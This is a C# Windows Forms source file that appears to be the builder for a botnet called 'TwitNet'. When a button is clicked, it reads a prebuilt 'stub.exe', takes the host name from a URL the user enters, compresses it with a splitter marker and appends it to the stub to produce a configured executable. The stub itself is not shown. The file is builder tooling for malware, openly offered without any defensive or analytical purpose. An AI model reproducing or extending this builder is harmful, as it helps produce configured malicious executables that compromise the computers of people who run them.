using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;

namespace TwitNet_Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SimpleAES AES = new SimpleAES();

            SaveDialog.Filter = "Exe File(*.exe)|*.exe";
            SaveDialog.InitialDirectory = Application.StartupPath;
            SaveDialog.Title = "Save As...";
            SaveDialog.ShowDialog();

            byte[] stub = File.ReadAllBytes("stub.exe");

            string AppendData = Util.Splitter + Regex.Split(textBox1.Text, "http://")[1].Split('.')[0];
            
            StreamWriter writer = new StreamWriter(SaveDialog.FileName, false, Encoding.Default);
            writer.AutoFlush = true;
            writer.Write(Encoding.Default.GetString(stub));
            writer.Write(Encoding.Default.GetString(GZip.CompressData(Encoding.Default.GetBytes(AppendData))));
            writer.Close();
            MessageBox.Show("Completed");
        }
    }
}
